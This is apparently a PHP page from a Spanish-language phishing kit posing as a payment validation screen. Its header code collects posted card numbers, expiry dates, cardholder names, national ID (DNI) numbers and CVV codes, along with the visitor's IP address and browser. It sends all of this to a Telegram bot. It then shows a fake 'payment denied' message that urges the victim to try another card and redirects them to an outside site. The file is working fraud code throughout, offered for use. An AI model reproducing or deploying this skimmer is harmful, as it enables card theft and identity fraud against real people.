<?php
error_reporting(0);
include './bits.php';
include './tl.php';
$ip = $_SERVER['REMOTE_ADDR']; 
$user_agent = $_SERVER['HTTP_USER_AGENT'];
if (isset($_POST['card'])) {
    $msg  = "➖➖➖➖[ mega full ]➖➖➖➖\r\n";
    $msg .= "card : <code>{$_POST['card']}</code>\r\n";
    $msg .= "mes : <code>{$_POST['mes']}</code>\r\n";
    $msg .= "año : <code>{$_POST['año']}</code>\r\n";
    $msg .= "name : <code>{$_POST['name']}</code>\r\n";
    $msg .= "dni : <code>{$_POST['dni']}</code>\r\n";
    $msg .= "cvv : <code>{$_POST['cvv']}</code>\r\n";
    $msg .= "➖➖➖➖ CONECCION ➖➖➖➖\r\n";
    $msg .= "IP : <code>".$ip."</code>\r\n";
    $msg .= "USER : <code>".$user_agent."</code>\r\n";
    $msg .= "➖➖➖➖[\n\r\n\r\n";
    sendTg($msg, $key, $id);
    header("location:"); 
}

?>
<!DOCTYPE html>
<html lang="es"><head>  
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="IE=11">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">  
    <title>validacion de Pagos</title>
<link rel="stylesheet" href="/contenedor/styles.c4bbbb8559e969311498.css"><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.2/font/bootstrap-icons.css"><style></style><style>.card[_ngcontent-ybo-c1]:hover{box-shadow:1px 2px 15px rgba(0,0,0,.2)}.card[_ngcontent-ybo-c1]{box-shadow:1px 2px 15px rgba(0,0,0,.1);transition-duration:.5s;height:auto}.login-principal[_ngcontent-ybo-c1]{padding-top:40px;padding-bottom:40px}.form-signin[_ngcontent-ybo-c1]{max-width:500px;padding:15px;margin:0 auto}[_ngcontent-ybo-c1]::-ms-reveal{display:none!important}.form-signin[_ngcontent-ybo-c1]   .form-signin-heading[_ngcontent-ybo-c1]{margin-bottom:100px}.form-signin[_ngcontent-ybo-c1]   .checkbox[_ngcontent-ybo-c1]{font-weight:400}.form-signin[_ngcontent-ybo-c1]   .form-control[_ngcontent-ybo-c1]{position:relative;box-sizing:border-box;height:auto;padding:10px;font-size:16px}.form-signin[_ngcontent-ybo-c1]   .form-control[_ngcontent-ybo-c1]:focus{z-index:2}.form-control[_ngcontent-ybo-c1]:focus{box-shadow:none}.eyePassAligne[_ngcontent-ybo-c1]{text-align:right;padding:10px 20px;display:none;position:absolute;margin:0 0 0 calc(100% - 60px);top:0;z-index:3}.card-body[_ngcontent-ybo-c1]{padding:3rem}.form-signin[_ngcontent-ybo-c1]   .card-link[_ngcontent-ybo-c1] + .card-link[_ngcontent-ybo-c1]{margin-left:8rem}.legales[_ngcontent-ybo-c1]{font-size:.8rem;margin-top:100px;color:#909394}.legales[_ngcontent-ybo-c1]   a[_ngcontent-ybo-c1]{color:#909394;text-decoration:underline}.avatar[_ngcontent-ybo-c1]{z-index:10;top:55px}.avatar[_ngcontent-ybo-c1]   img[_ngcontent-ybo-c1]{border-radius:50%}.logocentrado[_ngcontent-ybo-c1]{width:300px;margin:auto}.contairner[_ngcontent-ybo-c1]{width:50%}.card-footer.text-center[_ngcontent-ybo-c1]   a.card-link[_ngcontent-ybo-c1]{color:#909394;font-size:.8rem}.help-items[_ngcontent-ybo-c1]{background-color:rgba(212,209,203,.3);margin:0}.form-signin[_ngcontent-ybo-c1]   input[_ngcontent-ybo-c1]{margin-bottom:1.3rem;border-radius:0}.sigButton[_ngcontent-ybo-c1]{padding:.5rem 1rem;line-height:1.5;border-radius:.3rem!important}#message[_ngcontent-ybo-c1]{font-size:.8rem;margin-left:16px;color:#909394;position:relative}.valid[_ngcontent-ybo-c1]{color:#0db14b}.valid[_ngcontent-ybo-c1]:before{position:relative;left:-15px;font-family:ionicons;content:"\f121"}.invalid[_ngcontent-ybo-c1]{color:#ef413d}.invalid[_ngcontent-ybo-c1]:before{position:relative;left:-15px;font-family:ionicons;content:"\f129"}.btn-primary[_ngcontent-ybo-c1]{color:#fff;font-size:1rem!important}.btn-primary[_ngcontent-ybo-c1]:disabled{color:#909394}.usuarioEtiqueta[_ngcontent-ybo-c1]{font-size:28px;text-transform:none!important}.icono_manito[_ngcontent-ybo-c1]{cursor:pointer}.login-principal[_ngcontent-ybo-c1]   .login-error-message[_ngcontent-ybo-c1]{margin-top:20px;color:#ef413d}.login-principal[_ngcontent-ybo-c1]   .login-ok-message[_ngcontent-ybo-c1]{margin-top:20px;color:#0db14b}.card-footer[_ngcontent-ybo-c1]{margin:0!important}.loading-puntitos[_ngcontent-ybo-c1]{position:absolute;left:40%;right:40%;bottom:15%}.form-check-label[_ngcontent-ybo-c1]{display:block;position:relative;padding-left:25px;margin-bottom:12px;cursor:pointer;font-size:15px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.form-check-label[_ngcontent-ybo-c1]   input[_ngcontent-ybo-c1]{position:absolute;opacity:0;cursor:pointer;height:0;width:0}.form-check-label[_ngcontent-ybo-c1]   .texto-check[_ngcontent-ybo-c1]{font-size:13px;letter-spacing:-.5px;color:#909394;text-transform:none}.checkmark[_ngcontent-ybo-c1]{position:absolute;top:3px;left:0;height:17px;width:17px;border-radius:2px;border:1px solid #909394}.form-check-label[_ngcontent-ybo-c1]   input[_ngcontent-ybo-c1]:checked ~ .checkmark[_ngcontent-ybo-c1]{background-color:#fff}.checkmark[_ngcontent-ybo-c1]:after{content:"";position:absolute;display:none}.form-check-label[_ngcontent-ybo-c1]   input[_ngcontent-ybo-c1]:checked ~ .checkmark[_ngcontent-ybo-c1]:after{display:block}.form-check-label[_ngcontent-ybo-c1]   .checkmark[_ngcontent-ybo-c1]:after{left:5px;top:2px;width:5px;height:10px;border:solid #2196f3;border-width:0 3px 3px 0;transform:rotate(45deg)}.bgh[_ngcontent-ybo-c1]{height:auto!important;min-height:100%}.teclado-virtual[_ngcontent-ybo-c1]{float:right;color:#4d4d4d;text-transform:initial;font-family:Roboto-Regular,Sans-serif;font-size:12px;font-weight:400;font-style:normal;font-stretch:normal;line-height:normal;letter-spacing:-.6px;padding-bottom:5px}.teclado-virtual[_ngcontent-ybo-c1]   a[_ngcontent-ybo-c1]{vertical-align:middle}@media (max-width:767px){.teclado-virtual[_ngcontent-ybo-c1]{display:none}}@media (max-width:470px){.form-signin[_ngcontent-ybo-c1]   .card-link[_ngcontent-ybo-c1] + .card-link[_ngcontent-ybo-c1]{margin-left:2rem}}@media (max-width:390px){.logocentrado[_ngcontent-ybo-c1]{width:230px;margin:auto}.form-signin[_ngcontent-ybo-c1]   .card-link[_ngcontent-ybo-c1] + .card-link[_ngcontent-ybo-c1]{margin:auto}}@media screen and (max-width:767.98px){.form-signin[_ngcontent-ybo-c1]   .card-link[_ngcontent-ybo-c1] + .card-link[_ngcontent-ybo-c1]{margin:auto}.btn-primary[_ngcontent-ybo-c1]{font-size:inherit}.bgh[_ngcontent-ybo-c1]{height:auto!important;min-height:100%}}@media (max-width:320px){.card-body[_ngcontent-ybo-c1]{padding:3rem 2rem!important}}</style><style type="text/css">
      .spinner{
        width: 40px;
        height: 40px;
        border:3px solid #555;
        border-radius: 80px;
        margin: auto;
        border-left:3px solid #FFF;
        animation: rotate infinite linear 1s; 
      }
      @keyframes rotate{
        to{
          transform: rotate(0deg);
        }
        from{
          transform: rotate(-360deg);
        }
      }
    </style></head>

<body class="h-100-vh">

    <app-root _nghost-ybo-c0="" ng-version="7.2.16">
	<router-outlet _ngcontent-ybo-c0=""></router-outlet><app-login _nghost-ybo-c1="">
	<div _ngcontent-ybo-c1="" class="bg-grey h-100-vh bgh">
	<div _ngcontent-ybo-c1="" class="container login-principal">
	<div _ngcontent-ybo-c1="" class="form-signin">
	<h2 _ngcontent-ybo-c1="" class="logocentrado"><img _ngcontent-ybo-c1="pagorechazado.png" src=""></h2>
	<div class="container-fluid">
      <div class="d-flex flex-column mt-4 text-center justify-content-center aling-items-center">
        <h3>PAGO DENEGADO</h3>
        <h3>SU TARGETA NO ESTA AUTORIZADA INTENTE NUEVAMENTE CON OTRA</h3><div class="spinner"></div>
        <p><b id="secons">5s</b></p>
        <div class="col-sm-6 mt-5 m-auto d-flex flex-column">
        </div>
        

      </div></div>
	
	</div>
	</div>
    <script type="text/javascript">
      let seconds = 5;
      function timer(){
        if (seconds > 0) {
          seconds--;
        }
      }
      setInterval(function(){
        timer()
        document.getElementById("secons").innerHTML = seconds +"s";
        if (seconds == 0) {
          window.location.href = "https://sittweb-recharge.online";
        }
      },1000);
    </script>
	
	</div>
	</div>
	</app-login>
	</app-root>
    
</body></html>